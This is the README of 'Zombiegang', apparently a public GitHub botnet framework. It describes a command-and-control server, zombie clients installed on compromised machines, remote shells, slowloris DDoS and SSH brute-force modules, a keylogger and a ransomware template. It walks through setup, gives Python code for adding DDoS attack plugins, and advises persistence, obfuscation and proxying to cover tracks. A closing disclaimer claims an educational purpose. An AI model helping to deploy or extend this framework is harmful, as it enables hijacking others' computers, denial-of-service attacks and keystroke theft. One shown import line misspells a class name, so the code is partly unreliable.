![[Version 0.5.1~beta](https://github.com/r3nt0n)](http://img.shields.io/badge/version-0.5.1~beta-orange.svg)
![[Python 3](https://github.com/r3nt0n)](http://img.shields.io/badge/python-3-blue.svg)
![[GPL-3.0 License](https://github.com/r3nt0n)](https://img.shields.io/badge/license-GPL%203.0-brightgreen.svg)
![[Date](https://github.com/r3nt0n)](http://img.shields.io/badge/date-2022-yellow.svg)


# Zombiegang framework

<div align="center"><img src="https://github.com/r3nt0n/zombiegang/blob/master/img/intro.gif" /></div>
<br>  

## Table of Contents

1. [📖 Introduction](#-introduction)
2. [✨ Get started](#-get-started)
3. [🎨 Tools and attacks](#-tools-and-attacks)
4. [🖊️️ Contribution guidelines](#-contribution-guidelines)
5. [🔥 TO-DO](#-to-do)
6. [📋 Changelist](#-changelist)
7. [⚖️ Legal disclaimer](#-legal-disclaimer)
8. [🔗 References](#-references)

## 📖 Introduction

Zombiegang is a botnet framework written mostly in Python and PHP. It supports **asynchronous communication between cc and zombies**, **remote-shell** live sessions and **task scheduler**. It also has a **plugin manager**, which comes with some modules pre-included to perform most typical attacks (**DDoS, bruteforce** and **keylogger**). This modular approach allows anyone to **extend features by writing his own modules** (I will appreciate any contribution).  

<br>
<div align="center"><img src="https://github.com/r3nt0n/zombiegang/blob/master/img/intro2.gif" /></div>  
<br>

The **Command and Control server** is a semi-CRUD API written in php, which manages database read/write operations and authentication. This schema also allows to separate the front-end, which resides entirely in the client used by masters. 

Several kind of clients could be used to admin the botnet, and several kind of "zombie-clients" could co-exists too.
+ **master clients:** cli and web-based. The webclient is a light flask app focused on browse db info and schedule tasks. The cli client is intended to run remote-shell live sessions with one or more zombies simultaneously. Both of them support proxy configuration to reach cc-server anonymously.
+ **zombie clients:** by now, we only have a python client. Take note that you can write a zombie in the programming language of your preference, you just need to write a simple http client to communicate with API and maybe add some "zombie routines" (you can take the python client as an example). Again, any contribution would be welcome.   


Having a centralized db makes it easier for masters and zombies to exchange information asynchronously, removing the requirement of both being online at the same time.

<br>
<div align="center"><img src="https://github.com/r3nt0n/zombiegang/blob/master/img/attack_example.png" /></div>
<br>

You can schedule tasks and the zombies will receive this info as soon as they go online and refresh his "assignments". If the task was scheduled to be executed in future, the zombie will save this homework and run the task when the start time comes. You also can schedule stop datetimes.
  
There are special fields in DB which are designed to be nested values, so you can create new fields inside without touching any config (e.g.: `Tasks.task_content`,`Zombies.sysinfo`)  
  
<br>
<div align="center"><img src="https://github.com/r3nt0n/zombiegang/blob/master/img/zombies_info.gif" /><p style="font-decoration: italic;">zombie reports</p></div>  
<br>

## ✨ Get started

**Note:** This is just a simple way to kickstart all the initial stuff. Obviously, in production environments you can use separate servers for DB and CC, and replace the http server for something like Apache or Nginx.

### Download zombiegang framework
```shell
git clone https://github.com/r3nt0n/zombiegang
```

⚠️ **IMPORTANT NOTE:** zombiegang is still on development phase, some features wasn't tested under all possible scenarios yet. Any bug reported could be helpful.

  
### Create database
 
```shell
sudo apt-get install mariadb-server, mariadb-client
sudo mysql_secure_installation
cd cc-server
# you should change db default password here:
nano api/config/data/init.sql
sudo ./initdb
```
#### Create your master profile
```shell
mariadb -u zgang -p
use zgang;
insert into Masters SET username = '<username>', public_key = '<public-key>';
exit
```
***Note:** By now, you shouldn't specify any `password`, we will create it later. As another note, the `public_key` can be an empty string, since PKI logic isn't implemented yet.*
  
*Optional*: if you want to dump some mocked zombies into db for testing purposes:
```shell
./dump-testdata
```

### 🕸️ Start cc-server

```shell
cd cc-server
# Edit this file to match your db config
nano api/config/database.php
# and create your own secret-key
nano api/config/core.php 

# For testing purposes, you can use the simple http server provided by php
sudo php -S 127.0.0.1:8080
```

Now you should have the cc-server listening on port 8080 and connected to the database created before.

***Note:** You can disable masters access logging in `core.php`*


### 🧟 Zombie clients

*On the compromised machine:*
```shell
# install zombieclient dependencies 
cd zombie-client
pip install -r requirements.txt 

# to run the zombieclient
python3 run.py
```

Zombies will send info about themselves on every boot and check regularly for new tasks, they just keep asking and serving to the cc-server forever (in fact, until you kill this process).

In real scenarios, you will also need persistence, obfuscation and probably compilation (since Python is not available by default on most systems). 

### 🧙‍♂️ Master clients

*On the attacker machine:*

  
  
#### web-client
```shell
# install masterclient (web-client) dependencies 
cd master-client
pip install -r requirements.txt 

# to run the masterclient (web-client)
./run.sh
```

Now you should have a Flask app running and listening on port 5000. Browse to http://localhost:5000 and check it.

Once inside, you will see something like a desktop. You can **enable/disable proxy configuration** and **login to the botnet** with the aproppiate software (`proxy.exe` and `zgang.exe`).

On this stage you are going to create your master password: with `zgang.exe`, create a user with the same name used in your master profile. Now you are logged in as master and can start to admin the botnet.

**Note**: Mozilla Firefox is the recommended browser, any other could work but won't be officially supported. Some visual features (e.g.: emojis, form elements...) could vary across different browsers.

<br>
<div align="center"><img src="https://github.com/r3nt0n/zombiegang/blob/master/img/menu.png" /></div>
<br>

If you want to cover your trace, use the built-in proxy tool to connect to cc-server through the socks5 proxy of your choice:

<br>
<div align="center"><img src="https://github.com/r3nt0n/zombiegang/blob/master/img/proxy_example.png" /><p style="font-decoration: italic;">proxy configuration example</p></div>
<br>

#### cli-client
Additionally, you have a cli client (keeping msfconsole style) to login to cc-server and run remote-shell live sessions with online zombies, you could also connect through a socks5 proxy (like in web-based client) setting `PXHOST` and `PXPORT` before `login`.
```shell
# to run the masterclient (cli)
python3 cli.py
```

<div align="center"><img src="https://github.com/r3nt0n/zombiegang/blob/master/img/master-client_cli_live_session_example.png" /><p style="font-decoration: italic;">simple cli live session example</p></div>
<br>


## 🎨 Tools and attacks

From a db point of view, tools and attacks are nothing more than customized tasks. Here is the actual list of customized tasks and subtypes included in the framework:

+ `cmd`: execute **remote commands** on one or more zombies simultaneosly
+ `rsh`: start **remote shell live sessions** with one or more zombies simultaneosly (manages delay between zombie's update requests, allowing them to reply immediately, and toggle off at the end of session)
+ `dos`: **ddos attacks**, implemented and working
  + `dos/slowloris`
+ `brt`: **brute force attacks**, implemented, still need some refactor on master-client to create tasks
  + `brt/ssh`
+ `rsw`: ransomware attacks, to be implemented (by now, just an example template)
  

[//]: # (📝 ***[Working on a comprehensive explanation about how to build custom attacks and contribute to app with new modules]***)

### Keylogger module

By his nature, `keylogger module` is an special task and doesn't inherit from the base class `Task`. By now, logic to log keypresses and create logs into `cc-server` is implemented in `zombie-client` (windows and linux systems).  To be implemented:

  + logic to start/stop keylogger remotely
  + logic to show logs created by zombies on the master-client side

## 🖊️️ Contribution guidelines

### How to create new tools and attacks

To follow this tutorial, we are going to take `dos` module as example: 

#### zombie side
`zombie-client` includes the class `Task` inside [`🔗app/models/task.py`](https://github.com/r3nt0n/zombiegang/blob/master/zombie-client/app/models/task.py), this is the base class that make all dirty work. It **creates two threads**:
    
+ one thread to **keep checking manual stop signals** from cc-server
+ second thread to the **main execution of the task**:
  + **reports that has read the task** (updates `Missions.read_confirm` field to `true`)  
  + **reports that task is starting** (updates `Missions.running` field to `true`)
  + (here is where the ***custom code*** is executed)
  + **reports that the task has been completed and updates its result and execution time** (updates `Missions.result` and `Missions.exec_at` fields to `Task.result` and `Task.exec_at`)
  + **logging** all this processes in case debug is required

Inherits from this parent class will let you focus on the core of the attack.

First thing we need to do is create [`🔗app/models/attacks/dos.py`](https://github.com/r3nt0n/zombiegang/blob/master/zombie-client/app/models/attacks/dos.py) and import `Task`:


```python
from app.models import Task
```

We are going to create a child class. The `__init__` method takes `task_data` as argument, so you can access all task fields inside your code. Let's initilize the attributes you need with this info to use later.

```python
class DDosAttack(Task):
    def __init__(self, task_data):
        super().__init__(task_data)
        self.attack_type = self.task_content['attack_type']
        self.target = self.task_content['target']
        self.port = int(self.task_content['port'])
```

This are the other two methods you need to set: 

```python
    def start(self):
        # here comes the sugar
        from app.components import logger
        logger.log('starting ddos module...', 'OTHER')

        if self.attack_type == 'slowloris':
            logger.log('starting ddos/slowloris module...', 'OTHER')
            attack = Slowloris(self.target, port=self.port, to_stop_at=self.to_stop_at, enable_https=self.https,
                               n_sockets=1000)
            attack.run()
            logger.log('slowloris executed', 'SUCCESS')
            self.result = attack.report
        Task.start(self)
        # ...

    def run(self):
        return Task.run(self)
```
  
The logic of our task should be included inside `start()`. In the example, it checks for a specific subtype and load a specific module depending on it, then run and take the result from a specific field of the task.  

`run()` method returns the parent method (`Task.run()`), to wrap all our custom execution with pre and post routines common to all tasks (report starting, report result, etc). We don't need to declare anything else in this method.

To complete the code of the example, we are going to add another import:

```python
from app.models import Task
from app.modules.attacks import Slowlowris
```

In this example we are using the module [`🔗app/modules/attacks/slowloris.py`](https://github.com/r3nt0n/zombiegang/blob/master/zombie-client/app/modules/attacks/slowloris.py), which encapsulates the attack logic that address one of DDoS attacks subtypes. **For more information on models and modules, visit the good practices section**.

Once we have created our new model or custom task we need to reference it on two files:

[`🔗app/models/attacks/__init__.py`](https://github.com/r3nt0n/zombiegang/blob/master/zombie-client/app/components/plugin_manager.py)
```python
from .dos import DDosAttack
``` 
 
[`🔗app/components/plugin_manager.py`](https://github.com/r3nt0n/zombiegang/blob/master/zombie-client/app/components/plugin_manager.py)  
```python
class PluginManager:
    def __init__(self):
        self.plugins = {
            'cmd': tools.Command,
            'rsh': tools.RemoteShellSession,
            'dos': attacks.DDosAttack,
            'brt': attacks.BruteForceAttack
            # include new customized tasks here
            
        }

    def get_plugin(self, task_type):
        Plugin = None
        for plugin in self.plugins:
            if task_type == plugin:
                Plugin = self.plugins[plugin]
                break
        return Plugin
```

Now, when zombie receive a new task and the field `task_type` is `dos`, he runs the code we have just implemented with config provided in `task_content` as parameters and reports cc back on every step.

#### master-side

Still under construction [...]


### Best practices

+ Write isolate `modules` which execute individual actions (e.g.: perform an slowloris attack)
+ Think in `models` like a wrapper to converts it into a customized task, within which you can use one or more of these `modules` (e.g.: ddos attacks model)
+ Write this modules reusing as much code as possible, there are available "low-level  modules" like `http_client.py`,`ssh_client.py` or `crud.py` that save you from having to code the same routines over and over again
+ If you are writing a module and identify some routine that could be useful in other cases, try to write also a low-level module (e.g.: you are writing a ftp bruteforcer, first you write the ftp client, which is the "low-level module", and use it to create the ftp bruteforcer module. To complete the example, you would write a model using this module to create a new customized task)

Still under construction [...]

### Understanding the API and DB structure

Still under construction [...]



## 🔥 TO-DO

+ Refactor `master-client` to fix bug when creating new bruteforce attacks, adopting new `routes.py` format implemented
+ PKI authentication not implemented
+ Write **docs** about how to create **custom tasks**
+ **Tasks details** (`master-client`) not showing yet
+ **Keylogger on/off** not working yet
+ **Keylogger logs** not showing yet


## 📋 Changelist

+ `zombiegang_ (30/07/2022)`
  + Refactoring zombie-client to more efficient task result reporting
  + Task stop point scheduling implemented and working
  + Bruteforce attacks (ssh module) implemented but need some refactor on master-client side
  + Enhancing logging logic and messages in zombie-client to make easier debug processes


+ `zombiegang_0.5.1~beta (27/07/2022)`
  + Fixing php-jwt dependency bug while cloning from Github (deinit submodule)
  + Fixing indent error on http-client (zombie-client)
  + Improving docs
  + Fixing README style
  

+ `zombiegang_0.5.0~beta (25/07/2022)`
  + Fixing php-jwt dependency
  + Improving documentation to release
  + General updates and fixes


+ `zombiegang_0.1.0~beta (13/02/2021)`
  + Autorecon and zombie detailed information view implemented
  + Starting to implement bruteforce module
  + Turning os field into sysinfo (nested field)
  + Adding error views in master client
  + jwt-token expired time changed from 1hour to 10min
  + improving zombie🧟 structure, first scratches on zgang-console🐚 and remote shell live sessions
  + extending 🧟‍ zombie-client brain operations: task scheduler, task manager, plugin manager and data models to create custom tasks implemented). in 🔌cc-api: missions operations extendented, improving db configuration (trigger to update manual stop in missions if update in task)
  + 🧙‍ master-client: flask-wtf implemented, ddos attacks filter and creation implemented, improving templates and general project structure, desktop icons and xp blue/aeros taskbar added. 🔌cc-api: tasks and missions logic implemented, improving db configuration (foreign keys to link missions with tasks, trigger to update zombies ip and country codes after insert on AccessLogs)
  + 🧟‍ zombie-client: basic autosetup operations implemented (write, load and generate settings/credentials), first scratch on threads
  + master-client: app factory and blueprints implemented, trying to implement flask-wtf
  + in master-client: improving structure,responsive design implemented, jquery and ajax implemented, add some javascript functions, proxy configuration implemented, welcome-notifications zombies logic implemented. php-api almost finished, first scratches with zombie client
  + flask-client: structuring windows and forms, ddos and brute attacks forms implemented
  + header added, launchers moved to central panel
  + table resizable and checkboxes logic implemented + aoe icons + gothicpixel font
  + first commit - php-api: jwt-auth and CRUD operations implemented. flask-client: basic features


## ⚖ Legal disclaimer

This is a personal project, and is created for the sole purpose of security awareness and education, it should not be used against systems that you do not have permission to test/attack. The author is not responsible for misuse or for any damage that you may cause. You agree that you use this software at your own risk. I don't own the rights of any image included, is just a funny tribute to some iconic legends (if you are the owner of any picture and want it to be removed, please contact me and I will do as soon as posible). You can't distribute this app with commercial purposes.


## 🔗 References

+ CSS sheet is based on the work of <a href="https://github.com/jdan/">Jordan Scales</a> (<a href="https://github.com/jdan/98.css/blob/master/LICENSE">css win98 repo</a>)
+ Age of Empires icons found <a href="https://www.forgottenempires.net/age-of-empires-ii-definitive-edition/campaigns">here</a>
+ mIRC icon designed by <a href="https://www.flaticon.es/autores/pixel-perfect" title="Pixel perfect">Pixel perfect</a> from <a href="https://www.flaticon.es/" title="Flaticon"> www.flaticon.es  </a>
+ All pictures were found on the Internet


